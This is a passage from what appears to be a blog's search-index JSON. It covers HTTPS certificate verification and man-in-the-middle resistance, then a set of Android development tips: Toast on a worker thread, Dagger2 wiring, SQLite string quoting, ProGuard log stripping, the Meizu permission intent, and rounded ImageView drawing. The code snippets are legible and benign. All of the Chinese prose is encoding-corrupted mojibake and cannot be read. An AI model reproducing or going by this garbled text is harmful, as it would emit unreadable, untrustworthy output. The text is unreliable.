å¯†å…¬é’¥ï¼Œä»¥åŠè¯ä¹¦çš„é¢å‘æœºæ„ç­‰ä¿¡æ¯ã€‚ç¬¬ 2æ­¥æ—¶æœåŠ¡å™¨å‘é€äº†ä¸€ä¸ªSSLè¯ä¹¦ç»™å®¢æˆ·ç«¯ï¼ŒSSL è¯ä¹¦ä¸­åŒ…å«çš„å…·ä½“å†…å®¹æœ‰ï¼š ï¼ˆ1ï¼‰è¯ä¹¦çš„å‘å¸ƒæœºæ„CAï¼ˆ2ï¼‰è¯ä¹¦çš„æœ‰æ•ˆæœŸï¼ˆ3ï¼‰å…¬é’¥ï¼ˆ4ï¼‰è¯ä¹¦æ‰€æœ‰è€…ï¼ˆ5ï¼‰ç­¾å æ•°å­—ç­¾åæ˜¯ç”¨æ¥éªŒè¯æ•°æ®å®Œæ•´æ€§çš„ï¼Œé¦–å…ˆå°†å…¬é’¥ä¸ä¸ªäººä¿¡æ¯ç”¨ä¸€ä¸ªHashç®—æ³•ç”Ÿæˆä¸€ä¸ªæ¶ˆæ¯æ‘˜è¦ï¼ŒHashç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œä¸”åªè¦å†…å®¹å‘ç”Ÿå˜åŒ–ï¼Œé‚£ç”Ÿæˆçš„æ¶ˆæ¯æ‘˜è¦å°†ä¼šæˆªç„¶ä¸åŒã€‚ç„¶åCAå†ç”¨å®ƒçš„ç§é’¥å¯¹æ¶ˆæ¯æ‘˜è¦åŠ å¯†ï¼Œæœ€ç»ˆå½¢æˆæ•°å­—ç­¾åã€‚è¿˜æŠŠåŸå§‹ä¿¡æ¯å’Œæ•°æ®ç­¾ååˆå¹¶ï¼Œå½¢æˆä¸€ä¸ªå…¨æ–°çš„ä¸œè¥¿ï¼Œå«åšâ€œæ•°å­—è¯ä¹¦â€ å®¢æˆ·ç«¯åœ¨æ¥å—åˆ°æœåŠ¡ç«¯å‘æ¥çš„SSLè¯ä¹¦æ—¶ï¼Œä¼šå¯¹è¯ä¹¦çš„çœŸä¼ªè¿›è¡Œæ ¡éªŒï¼Œä»¥æµè§ˆå™¨ä¸ºä¾‹è¯´æ˜å¦‚ä¸‹ï¼š ï¼ˆ1ï¼‰é¦–å…ˆæµè§ˆå™¨è¯»å–è¯ä¹¦ä¸­çš„è¯ä¹¦æ‰€æœ‰è€…ã€æœ‰æ•ˆæœŸç­‰ä¿¡æ¯è¿›è¡Œä¸€ä¸€æ ¡éªŒ ï¼ˆ2ï¼‰æµè§ˆå™¨å¼€å§‹æŸ¥æ‰¾æ“ä½œç³»ç»Ÿä¸­å·²å†…ç½®çš„å—ä¿¡ä»»çš„è¯ä¹¦å‘å¸ƒæœºæ„CAï¼Œä¸æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦ä¸­çš„é¢å‘è€…CAæ¯”å¯¹ï¼Œç”¨äºæ ¡éªŒè¯ä¹¦æ˜¯å¦ä¸ºåˆæ³•æœºæ„é¢å‘ ï¼ˆ3ï¼‰å¦‚æœæ‰¾ä¸åˆ°ï¼Œæµè§ˆå™¨å°±ä¼šæŠ¥é”™ï¼Œè¯´æ˜æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦æ˜¯ä¸å¯ä¿¡ä»»çš„ã€‚ ï¼ˆ4ï¼‰å¦‚æœæ‰¾åˆ°ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šä»æ“ä½œç³»ç»Ÿä¸­å–å‡º é¢å‘è€…CA çš„å…¬é’¥ï¼Œç„¶åå¯¹æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦é‡Œé¢çš„ç­¾åè¿›è¡Œè§£å¯† ï¼ˆ5ï¼‰æµè§ˆå™¨ä½¿ç”¨ç›¸åŒçš„hashç®—æ³•è®¡ç®—å‡ºæœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦çš„hashå€¼ï¼Œå°†è¿™ä¸ªè®¡ç®—çš„hashå€¼ä¸è¯ä¹¦ä¸­ç­¾ååšå¯¹æ¯” ï¼ˆ6ï¼‰å¯¹æ¯”ç»“æœä¸€è‡´ï¼Œåˆ™è¯æ˜æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦åˆæ³•ï¼Œæ²¡æœ‰è¢«å†’å…… ï¼ˆ7ï¼‰æ­¤æ—¶æµè§ˆå™¨å°±å¯ä»¥è¯»å–è¯ä¹¦ä¸­çš„å…¬é’¥ï¼Œç”¨äºåç»­åŠ å¯†äº† 4ã€æ‰€ä»¥é€šè¿‡å‘é€SSLè¯ä¹¦çš„å½¢å¼ï¼Œæ—¢è§£å†³äº†å…¬é’¥è·å–é—®é¢˜ï¼Œåˆè§£å†³äº†é»‘å®¢å†’å……é—®é¢˜ï¼Œä¸€ç®­åŒé›•ï¼ŒHTTPSåŠ å¯†è¿‡ç¨‹ä¹Ÿå°±æ­¤å½¢æˆ æˆ‘æ˜¯è¿™æ ·ç†è§£è¿™ä¸ªhttpsæ˜¯å¦‚ä½•è§£å†³ä¸­é—´äººæ”»å‡»é—®é¢˜çš„ï¼šæ•°å­—è¯ä¹¦åŒ…æ‹¬ï¼šè¯ä¹¦çš„å‘å¸ƒæœºæ„CAï¼Œè¯ä¹¦çš„æœ‰æ•ˆæœŸï¼Œå…¬é’¥ï¼Œè¯ä¹¦æ‰€æœ‰è€…ï¼Œç­¾åï¼ˆå‰é¢å‡ ä¸ªæ˜æ–‡çš„hashå€¼ï¼‰ä½œä¸ºä¸€ä¸ªä¸­é—´äººï¼šæˆ‘å¯ä»¥ä¼ªé€ è¯ä¹¦çš„å‘å¸ƒæœºæ„CAï¼Œè¯ä¹¦çš„æœ‰æ•ˆæœŸï¼Œè¯ä¹¦æ‰€æœ‰è€…ï¼Œä½†æ˜¯å…¬é’¥æˆ‘å¿…é¡»å¾—æ¢æˆæˆ‘è‡ªå·±çš„å•Šï¼ˆç™¾åº¦å…¬é’¥åŠ å¯†çš„ä¸œè¥¿æˆ‘åˆè§£ä¸å¼€ï¼‰ï¼Œå¥½äº†ï¼Œè¿™ä¸‹æ˜æ–‡å†…å®¹è‚¯å®šè¦æ”¹äº†ã€‚è¿™ä¸‹å¯¼è‡´ç­¾å(hashå€¼)ä¸å¯¹äº†ï¼Œå®¢æˆ·ç«¯è‚¯å®šä¸è®¤ï¼Œç”¨ç™¾åº¦å‘è¿‡æ¥çš„çš„ï¼Ÿå½“ç„¶ä¸è¡Œäº†ã€‚çå†™ä¸€ä¸ªï¼Ÿå®¢æˆ·ç«¯æ‹¿ç€æ“ä½œç³»ç»Ÿå†…ç½®çš„CAè¯ä¹¦å»è§£å¯†ä½ è¿™æ®µçå†™çš„hashï¼Œè‚¯å®šä¸å¯¹ã€‚å”¯ä¸€èƒ½å®ç°å¯¹çš„ä¸Šçš„æƒ…å†µæ˜¯ã€‚è®©CAç”¨è‡ªå·±çš„ç§é’¥æŠŠï¼ˆç™¾åº¦çš„è¯ä¹¦çš„å‘å¸ƒæœºæ„CAï¼Œç™¾åº¦è¯ä¹¦çš„æœ‰æ•ˆæœŸï¼Œæˆ‘çš„å…¬é’¥ï¼Œç™¾åº¦çš„è¯ä¹¦æ‰€æœ‰è€…è¿™äº›ä¸œè¥¿åŠ å¯†ä¸€éï¼Œè¿™æ ·å®¢æˆ·ç«¯ç”¨CAè§£å¯†å‡ºæ¥çš„hashä¹Ÿä¸€æ ·äº†ï¼‰ã€‚ä½†æ˜¯è¿™æ€ä¹ˆå¯èƒ½ï¼Ÿ å‚è€ƒå¸¸è§ç½‘ç»œåè®®ä¼˜åŒ–ä¸æ¼”è¿›","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"AndroidçŸ¥è¯†é›†åˆ[å››]","date":"2018-04-13T13:53:52.000Z","path":"2018/04/13/2018-04-13-android-cheat-sheet-four/","text":"1. åœ¨å­çº¿ç¨‹ä¸­æ˜¾ç¤ºä¸€ä¸ªToastæ˜¯äº²æµ‹å¯è¡Œçš„ä¸æ˜¯é‚£ç§poståˆ°ä¸»çº¿ç¨‹çš„æ–¹æ¡ˆå…¶å®çŸ¥ä¹ä¸Šå·²ç»æœ‰äº†è®¨è®º static class ToastThread extends Thread { Context mContext; public ToastThread(Context mContext) { this.mContext = mContext; } @Override public void run() { Looper.prepare(); String threadId = String.valueOf(Thread.currentThread().getId()); Toast.makeText(mContext,threadId,Toast.LENGTH_SHORT).show(); Looper.loop(); } } å…¶å®Toastçš„åŸç†å°±æ˜¯é€šè¿‡IPCå‘NotificationManagerè¯·æ±‚åŠ å…¥é˜Ÿåˆ—ï¼Œåè€…ä¼šæ£€æµ‹æƒé™xxxxã€‚ç„¶åé€šè¿‡ä¸Šé¢çš„ipcå›è°ƒåˆ°å®¢æˆ·ç«¯çš„onTransactä¸­ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯èµ°åˆ°äº†Toast.TNè¿™ä¸ªstatic inner classçš„handlerä¸­ï¼Œå‘é€ä¸€ä¸ªMessageï¼ŒhandlerMessageä¸­å®Œæˆäº†WindowManager.addViewçš„æ“ä½œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¿˜æ˜¯å­çº¿ç¨‹ï¼Œæ‰€ä»¥ç¡®å®å¯èƒ½å­˜åœ¨å¤šæ¡çº¿ç¨‹åŒæ—¶æ“ä½œUIçš„ç°è±¡ã€‚ä»å½¢å¼ä¸Šçœ‹ï¼Œä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹ä¸­çš„Toastå¯¹è±¡å„è‡ªé€šè¿‡è‡ªå·±çš„Looperç»´æŠ¤äº†ä¸€ä¸ªæ¶ˆæ¯å¾ªç¯é˜Ÿåˆ—ï¼Œè¿™å…¶ä¸­çš„æ¶ˆæ¯ç±»å‹åŒ…æ‹¬show,hideå’Œcancelã€‚æ‰€ä»¥å¯èƒ½å­˜åœ¨å¤šæ¡çº¿ç¨‹åŒæ—¶è°ƒç”¨WindowManagerçš„æ–¹æ³•ï¼ŒViewä¹Ÿæ˜¯æ¯æ¡çº¿ç¨‹å„è‡ªç‹¬æœ‰çš„ï¼Œæœ€åçš„åœºæ™¯è«è¿‡äºä¸¤æ¡çº¿ç¨‹åŒæ—¶å„è‡ªæ·»åŠ äº†ä¸€ä¸ªViewåˆ°windowä¸Šã€‚å¦å¤–ï¼Œå­çº¿ç¨‹ä¸­å¼•å…¥looperçš„å½¢å¼ä¹Ÿé€ æˆäº†å­çº¿ç¨‹å®è´¨ä¸Šçš„é˜»å¡ï¼Œå½“ç„¶å¯ä»¥ç›´æ¥å½“æˆä¸€ä¸ªhandlerThreadæ¥ç”¨ã€‚æ‰€ä»¥ä¸æ˜¯å¾ˆæ¨èè¿™ä¹ˆå¹²ï¼Œåªæ˜¯è¯´å¯ä»¥åšã€‚Toast.TN.handleShow try { mWM.addView(mView, mParams); trySendAccessibilityEvent(); } catch (WindowManager.BadTokenException e) { /* ignore */ } 2.ContentProviderçš„onCreateè¦æ—©äºApplicationçš„onCreateå‘ç”Ÿæ¯”å¦‚ArchitectureComponentä¸­çš„lifeCycleå°±æ˜¯è¿™ä¹ˆå¹²çš„ï¼Œå†™äº†ä¸ªdummpyçš„contentProviderï¼Œåœ¨providerçš„onCreateä¸­å»loadLibrary. 3. çœ‹åˆ°ä¸€ä¸ªå…³äºapkåç¼–è¯‘å’Œé‡æ–°æ‰“åŒ…çš„å¸–å­ï¼Œéå¸¸å¥½ç”¨Android apkåç¼–è¯‘åŠé‡æ–°æ‰“åŒ…æµç¨‹ï¼Œå…³é”®è¯apktoolã€‚ä½†æ˜¯ï¼Œ360åŠ å›ºä¹‹åçš„apkæ˜¯ä¸èƒ½ç”¨dex2jaræŸ¥çœ‹javaä»£ç çš„ã€‚ 4.ä»base.apkè°ˆåˆ°apkå®‰è£…çš„è¿‡ç¨‹APKå®‰è£…è¿‡ç¨‹ã€‚ä¹‹å‰æ— æ„é—´åœ¨FileExplorerä¸­çœ‹åˆ°äº†base.apkè¿™ä¸ªæ–‡ä»¶ï¼Œç”±æ­¤å±•å¼€apkå®‰è£…è¿‡ç¨‹çš„ç ”ç©¶ã€‚ 5.å…³äºæ¨¡å—åŒ–å’Œé¡¹ç›®é‡æ„å¾ˆå¤šå…³äºAndroidç”šè‡³javaé¡¹ç›®çš„é‡æ„çš„æ–‡ç« éƒ½ä¼šæœ€ç»ˆæåˆ°ä¸¤æ¡ï¼šé¢å‘æ¥å£ç¼–ç¨‹ -&gt; ä¾èµ–æ³¨å…¥(IOC)ç„¶åè·Ÿä¸Šä¸€å¤§å †ä¸“ä¸šåˆ†æå’Œæ²¡ä»€ä¹ˆç”¨çš„åºŸè¯ã€‚è¿™ä¿©åœ¨javaçš„é¢†åŸŸç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šåœ¨Aæ¨¡å—ä¸­ç”¨Dagger2ç”ŸæˆBæ¨¡å—ä¸­å®šä¹‰çš„interfaceçš„implå®ä¾‹ã€‚å…¶å®ä¸ç”¨Dagger2ä¹Ÿè¡Œï¼Œå°±æ˜¯æ¯æ¬¡åœ¨Bæ¨¡å—çš„ç”Ÿå‘½å‘¨æœŸå¼€å§‹æ—¶å‡†å¤‡ä¸€ä¸ªHashMap&lt;interfaceClass,ImplClass&gt;è¿™æ ·çš„ä¸€å¤§å †é”®å€¼å¯¹ï¼Œç„¶ååœ¨Aæ¨¡å—ä¸­æ ¹æ®æƒ³è¦çš„interface classå»æ‰¾impl classï¼Œç”¨åå°„å»åˆ›å»ºï¼Œç”Ÿäº§ç¯å¢ƒè‚¯å®šä¸èƒ½è¿™ä¹ˆå¹²ã€‚åœ¨Dagger2ä¸­å¤§è‡´æ˜¯è¿™ä¹ˆå¹²çš„ï¼š å…ˆå£°æ˜å¥½Bæ¨¡å—å¯¹å¤–æä¾›çš„æ¥å£ï¼Œä»¥ä¸‹è¿™ä¿©éƒ½åœ¨å¦ä¸€ä¸ªmoduleä¸­ï¼ŒA moduleé€šè¿‡gradleå¼•ç”¨äº†Bæ¨¡å— public interface Store { String sell(); } public class StoreImpl implements Store { @Override public String sell() { return &quot;Dummy products&quot;; } } Bæ¨¡å—ä¸­å†æä¾›Componentå’Œprovideçš„module @Component(modules = StoreModule.class) public interface StoreComponent { Store eject(); } @Module public class StoreModule { @Provides Store provideStore() { return new StoreImpl(); } } Aæ¨¡å—ä¸­æœ€ç»ˆä½¿ç”¨çš„æ–¹å¼åº”è¯¥æ˜¯ Store store = DaggerStoreComponent.builder().build().eject(); 6.å†™sqliteè¯­å¥çš„æ—¶å€™æ€»æ˜¯å®¹æ˜“å‡ºå°é”™è¯¯//é”™è¯¯å†™æ³• CREATE TABLE IF NOT EXISTS table_one ( _id INTEGER PRIMARY KEY AUTOINCREMENT, studentName TEXT,studentNick TEXT) INSERT OR IGNORE INTO table_one (studentName,studentNick) VALUES ( name1,nick1) // SQLiteException: no such column: name1 (code 1) æŠ¥é”™ //æ­£ç¡®å†™æ³• CREATE TABLE IF NOT EXISTS table_one ( _id INTEGER PRIMARY KEY AUTOINCREMENT, studentName TEXT,studentNick TEXT) INSERT OR IGNORE INTO table_one (studentName,studentNick) VALUES ( &#39;name1&#39;,&#39;nick1&#39;) å”¯ä¸€çš„åŒºåˆ«å°±åœ¨äºname1å’Œnick1è¿™ä¿©ç”¨ å•å¼•å·å•å¼•å·å•å¼•å· åŒ…èµ·æ¥äº†ã€‚ 7. Webviewçš„å‘çš„æ€»ç»“WebViewçš„é‚£äº›å‘ 8.BitmapRegionDecoderä¸è¦éšä¾¿ç”¨ï¼Œåˆ°å¤„æ˜¯å‘ï¼Œä¸»è¦é—®é¢˜å’Œjpgå›¾ç‰‡çš„colorSpaceæœ‰å…³ï¼ŒåŠ¨ä¸åŠ¨å°±çˆ†å‡ºIOException The Skia library on which BitmapRegionDecoder is based had some bugs that will not be fixed in versions of Android prior to Nougat or Oreo. It will still display the vast majority of images properly, but you may see problems displaying CMYK JPGs, and grayscale PNGs, especially on older devices. To reduce the frequency of these problems, the view automatically falls back to BitmapFactory when the image does not need to be subsampled.subsampling-scale-image-viewè¿™ä¸ªåº“ 9.Bitmapå¯¹è±¡çš„recycleé—®é¢˜è¿˜æ˜¯è¦è°ƒç”¨Bitmapç±»æœ‰ä¸€ä¸ªæ–¹æ³•recycle()ï¼Œä»æ–¹æ³•åå¯ä»¥çœ‹å‡ºæ„æ€æ˜¯å›æ”¶ã€‚è¿™é‡Œå°±æœ‰ç–‘é—®äº†ï¼ŒAndroidç³»ç»Ÿæœ‰è‡ªå·±çš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå¯ä»¥ä¸å®šæœŸçš„å›æ”¶æ‰ä¸ä½¿ç”¨çš„å†…å­˜ç©ºé—´ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬Bitmapçš„ç©ºé—´ã€‚é‚£ä¸ºä»€ä¹ˆè¿˜éœ€è¦è¿™ä¸ªæ–¹æ³•å‘¢ï¼ŸBitmapç±»çš„æ„é€ æ–¹æ³•éƒ½æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥å¼€å‘è€…ä¸èƒ½ç›´æ¥newå‡ºä¸€ä¸ªBitmapå¯¹è±¡ï¼Œåªèƒ½é€šè¿‡BitmapFactoryç±»çš„å„ç§é™æ€æ–¹æ³•æ¥å®ä¾‹åŒ–ä¸€ä¸ªBitmapã€‚ä»”ç»†æŸ¥çœ‹BitmapFactoryçš„æºä»£ç å¯ä»¥çœ‹åˆ°ï¼Œç”ŸæˆBitmapå¯¹è±¡æœ€ç»ˆéƒ½æ˜¯é€šè¿‡JNIè°ƒç”¨æ–¹å¼å®ç°çš„ã€‚æ‰€ä»¥ï¼ŒåŠ è½½Bitmapåˆ°å†…å­˜é‡Œä»¥åï¼Œæ˜¯åŒ…å«ä¸¤éƒ¨åˆ†å†…å­˜åŒºåŸŸçš„ã€‚ç®€å•çš„è¯´ï¼Œä¸€éƒ¨åˆ†æ˜¯Javaéƒ¨åˆ†çš„ï¼Œä¸€éƒ¨åˆ†æ˜¯Céƒ¨åˆ†çš„ã€‚è¿™ä¸ªBitmapå¯¹è±¡æ˜¯ç”±Javaéƒ¨åˆ†åˆ†é…çš„ï¼Œä¸ç”¨çš„æ—¶å€™ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å›æ”¶äº†ï¼Œä½†æ˜¯é‚£ä¸ªå¯¹åº”çš„Cå¯ç”¨çš„å†…å­˜åŒºåŸŸï¼Œè™šæ‹Ÿæœºæ˜¯ä¸èƒ½ç›´æ¥å›æ”¶çš„ï¼Œè¿™ä¸ªåªèƒ½è°ƒç”¨åº•å±‚çš„åŠŸèƒ½é‡Šæ”¾ã€‚æ‰€ä»¥éœ€è¦è°ƒç”¨recycle()æ–¹æ³•æ¥é‡Šæ”¾Céƒ¨åˆ†çš„å†…å­˜ã€‚ä»Bitmapç±»çš„æºä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œrecycle()æ–¹æ³•é‡Œä¹Ÿçš„ç¡®æ˜¯è°ƒç”¨äº†JNIæ–¹æ³•äº†çš„ã€‚é‚£å¦‚æœä¸è°ƒç”¨recycle()ï¼Œæ˜¯å¦å°±ä¸€å®šå­˜åœ¨å†…å­˜æ³„éœ²å‘¢ï¼Ÿä¹Ÿä¸æ˜¯çš„ã€‚Androidçš„æ¯ä¸ªåº”ç”¨éƒ½è¿è¡Œåœ¨ç‹¬ç«‹çš„è¿›ç¨‹é‡Œï¼Œæœ‰ç€ç‹¬ç«‹çš„å†…å­˜ï¼Œå¦‚æœæ•´ä¸ªè¿›ç¨‹è¢«åº”ç”¨æœ¬èº«æˆ–è€…ç³»ç»Ÿæ€æ­»äº†ï¼Œå†…å­˜ä¹Ÿå°±éƒ½è¢«é‡Šæ”¾æ‰äº†ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬Céƒ¨åˆ†çš„å†…å­˜ã€‚Androidå¯¹äºè¿›ç¨‹çš„ç®¡ç†æ˜¯éå¸¸å¤æ‚çš„ã€‚ç®€å•çš„è¯´ï¼ŒAndroidç³»ç»Ÿçš„è¿›ç¨‹åˆ†ä¸ºå‡ ä¸ªçº§åˆ«ï¼Œç³»ç»Ÿä¼šåœ¨å†…å­˜ä¸è¶³çš„æƒ…å†µä¸‹æ€æ­»ä¸€äº›ä½ä¼˜å…ˆçº§çš„è¿›ç¨‹ï¼Œä»¥æä¾›ç»™å…¶å®ƒè¿›ç¨‹å……è¶³çš„å†…å­˜ç©ºé—´ã€‚åœ¨å®é™…é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæœ‰çš„å¼€å‘è€…ä¼šåœ¨é€€å‡ºç¨‹åºçš„æ—¶å€™ä½¿ç”¨Process.killProcess(Process.myPid())çš„æ–¹å¼å°†è‡ªå·±çš„è¿›ç¨‹æ€æ­»ï¼Œä½†æ˜¯æœ‰çš„åº”ç”¨ä»…ä»…ä¼šä½¿ç”¨è°ƒç”¨Activity.finish()æ–¹æ³•çš„æ–¹å¼å…³é—­æ‰æ‰€æœ‰çš„Activityã€‚ 10. åŸæ¥layer_listè¿˜å¯ä»¥è¿™ä¹ˆç”¨å•Šç»™ä¸€ä¸ªViewåŠ è¾¹æ¡†ï¼Œåªåœ¨å·¦è¾¹ï¼Œä¸Šé¢å’Œä¸‹é¢ä¸‰æ¡è¾¹ä¸ŠåŠ è¾¹æ¡†ï¼Œç”¨layer_listå°±å¯ä»¥äº† &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;layer-list xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;!-- è¿æ¡†é¢œè‰²å€¼ --&gt; &lt;item&gt; &lt;shape&gt; &lt;solid android:color=&quot;@color/md_blue_700&quot; /&gt; &lt;/shape&gt; &lt;/item&gt; &lt;!-- ä¸»ä½“èƒŒæ™¯é¢œè‰²å€¼ --&gt; &lt;!-- æ­¤å¤„å®šä¹‰åªæœ‰ä¸Šä¸‹ä¸¤è¾¹æœ‰è¾¹æ¡† é«˜åº¦ä¸º1åƒç´ --&gt; &lt;item android:bottom=&quot;10dp&quot; android:left=&quot;10dp&quot; android:top=&quot;10dp&quot;&gt; &lt;!--è¾¹æ¡†é‡Œé¢èƒŒæ™¯é¢œè‰² ç™½è‰²--&gt; &lt;shape&gt; &lt;solid android:color=&quot;#ffffff&quot; /&gt; &lt;/shape&gt; &lt;/item&gt; &lt;/layer-list&gt; 11.proguardå¯ä»¥æŠŠlogå¹²æ‰-assumenosideeffects class android.util.Log { public static boolean isLoggable(java.lang.String, int); public static int v(...); public static int i(...); public static int w(...); public static int d(...); public static int e(...); } 12.å›½äº§Romçš„æƒé™é—®é¢˜æ˜¯åœ¨æ˜¯å¤´ç–¼ä»¥5.1çš„romä¸ºä¾‹ if(ContextCompat.checkSelfPermission(activity,Manifest.permission.Camera)== PackageManager.PERMISSION_GRANTED): Camera c = Camera.open();// è¿˜æ˜¯null ç±»ä¼¼çš„é—®é¢˜è¡ç”Ÿå‡ºäº†å›½äº§æ‰‹æœº5.0,6.0æƒé™é€‚é…æ¡†æ¶æ‰¾åˆ°äº†å¯åŠ¨é­…æ—æƒé™ç®¡ç†çš„Activityçš„ä»£ç  final String N_MANAGER_OUT_CLS = &quot;com.meizu.safe.permission.PermissionMainActivity&quot;; final String L_MANAGER_OUT_CLS = &quot;com.meizu.safe.SecurityMainActivity&quot;; // 5.1ä¸Šå«åšè¿™ä¸ªåå­— final String PKG = &quot;com.meizu.safe&quot;; Activity activity = (Activity) context; Intent intent = new Intent(); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.putExtra(&quot;package&quot;, activity.getPackageName()); ComponentName comp = new ComponentName(PKG, L_MANAGER_OUT_CLS); intent.setComponent(comp); activity.startActivity(intent); 13. Canvas.clipPathä¼šå‡ºç°é”¯é½¿çš„é—®é¢˜ä»¥åŠå¯èƒ½çš„è§£å†³æ–¹æ¡ˆa Naive implementation of CircleImageView would look something like this:xmlé‡Œé¢å®½é«˜éƒ½å†™æˆ200dpï¼Œæ–¹ä¾¿ä¸€ç‚¹ã€‚ import android.content.Context; import android.graphics.Canvas; import android.graphics.Path; import android.graphics.RectF; import android.support.v7.widget.AppCompatImageView; import android.util.AttributeSet; public class RoundCornerImageView1 extends AppCompatImageView { float[] radiusArray = new float[8]; public RoundCornerImageView1(Context context) { super(context); init(); } public RoundCornerImageView1(Context context, AttributeSet attrs) { super(context, attrs); init(); } public RoundCornerImageView1(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } private void init() { setScaleType(ScaleType.CENTER_CROP); } public void setRadius(float leftTop, float rightTop, float rightBottom, float leftBottom) { radiusArray[0] = leftTop; radiusArray[1] = leftTop; radiusArray[2] = rightTop; radiusArray[3] = rightTop; radiusArray[4] = rightBottom; radiusArray[5] = rightBottom; radiusArray[6] = leftBottom; radiusArray[7] = leftBottom; invalidate(); } @Override protected void onDraw(Canvas canvas) { Path path = new Path(); int width = getWidth(); int height = getHeight(); setRadius(width/2,width/2,height/2,height/2); path.addRoundRect(new RectF(0, 0, width,height), radiusArray, Path.Direction.CW); canvas.clipPath(path); super.onDraw(canvas); } } ä¸å‡ºæ„å¤–çš„è¯ï¼Œåœ¨çœŸæœºä¸Šè¿è¡Œä¼šå‡ºç°åœ†å½¢è¾¹è§’æœ‰é”¯é½¿çš„é—®é¢˜ã€‚googleä¸€ä¸‹clipPathé”¯é½¿å°±ä¼šå‘ç°ç±»ä¼¼çš„issueï¼Œframeworkåªæ˜¯å¯¹skia libraryçš„ä¸€å±‚å¾ˆè–„çš„åŒ…è£…ã€‚ æ—©å…ˆç‰ˆæœ¬çš„ç³»ç»Ÿç”»åœ†å¼§ä¼¼ä¹ä¸æ˜¯ç‰¹åˆ«å‡† å¤šæ•°æ—¶å€™å¯¹è¿™ç§é—®é¢˜çš„è§£å†³æ–¹å¼æ˜¯ä½¿ç”¨PorterDuff.SRCINçš„æ–¹å¼ï¼Œç”¨canvas saveLayer(è²Œä¼¼layeræ˜¯ä¸€ç§æ ˆçš„ç»“æ„)çš„æ–¹å¼åœ¨å…¶ä»–çš„layerä¸­å»ç”»bitmapã€‚æœ€åé¡¶å±‚çš„layerå…¨éƒ¨popæ‰ä¹‹åä¼šåˆå¹¶åˆ°initialçš„layerä¸Šï¼Œç±»ä¼¼äºåœ¨é¡¶å±‚çš„layerä¸­åˆæˆè¿™å¼ bitmapã€‚canvas.saveLayer(0, 0, w, h, null, Canvas.ALL_SAVE_FLAG); // å¤§è‡´å°±åœ¨è¿™é‡Œ,layerä¼¼ä¹å¯ä»¥ç†è§£æˆphotoShopé‡Œé¢çš„å›¾å±‚çš„æ¦‚å¿µ public class RoundCornerImageView2 extends AppCompatImageView { // å››ä¸ªè§’çš„x,yåŠå¾„ private float[] radiusArray = { 0f, 0f, 0f, 0f, 0f, 0f, 0f, 0f }; private Paint bitmapPaint = new Paint(Paint.ANTI_ALIAS_FLAG); private Bitmap makeRoundRectFrame(int w, int h) { Bitmap bm = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888); Canvas c = new Canvas(bm); Path path = new Path(); setRadius(w/2,w/2,h/2,h/2); path.addRoundRect(new RectF(0, 0, w, h), radiusArray, Path.Direction.CW); Paint bitmapPaint = new Paint(Paint.ANTI_ALIAS_FLAG); bitmapPaint.setColor(Color.GREEN); // é¢œè‰²éšæ„ï¼Œä¸è¦æœ‰é€æ˜åº¦ã€‚ c.drawPath(path, bitmapPaint); return bm; } public RoundCornerImageView2(Context context) { super(context); init(); } public RoundCornerImageView2(Context context, AttributeSet attrs) { super(context, attrs); init(); } public RoundCornerImageView2(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } private void init() { // setLayerType(LAYER_TYPE_SOFTWARE, null); // Xfermode éœ€è¦ç¦ç”¨ç¡¬ä»¶åŠ é€Ÿ setScaleType(ScaleType.CENTER_CROP); } public void setRadius(float leftTop, float rightTop, float rightBottom, float leftBottom) { radiusArray[0] = leftTop; radiusArray[1] = leftTop; radiusArray[2] = rightTop; radiusArray[3] = rightTop; radiusArray[4] = rightBottom; radiusArray[5] = rightBottom; radiusArray[6] = leftBottom; radiusArray[7] = leftBottom; } @Override protected void onDraw(Canvas canvas) { final int w = getWidth(); final int h = getHeight(); Bitmap bitmapOriginal = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888); Canvas c = new Canvas(bitmapOriginal); super.onDraw(c); Bitmap bitmapFrame = makeRoundRectFrame(w, h); int sc = canvas.saveLayer(0, 0, w, h, null); canvas.drawBitmap(bitmapFrame, 0, 0, bitmapPaint); //å…ˆç”»ä¸€ä¸ªåœ†å½¢çš„æ¡†æ¡†æ¡æ¡å‡ºæ¥ // åˆ©ç”¨Xfermodeå–äº¤é›†ï¼ˆåˆ©ç”¨bitmapFrameä½œä¸ºç”»æ¡†æ¥è£å‰ªbitmapOriginalï¼‰ bitmapPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN)); //åç»­çš„ç”»å›¾æ“ä½œï¼Œåªæœ‰äº¤é›†çš„éƒ¨åˆ†æ‰ä¼šæ˜¾ç¤ºåœ¨æœ€ç»ˆçš„canvasä¸Š canvas.drawBitmap(bitmapOriginal, 0, 0, bitmapPaint); bitmapPaint.setXfermode(null); canvas.restoreToCount(sc); } } è¿™ç§æ–¹å¼ä¸€èˆ¬ç§°ä¸ºç¦»å±ç¼“å†² 14. jniä½¿ç”¨ä¸€èˆ¬ä½¿ç”¨javahç”Ÿæˆheaderæ–‡ä»¶ 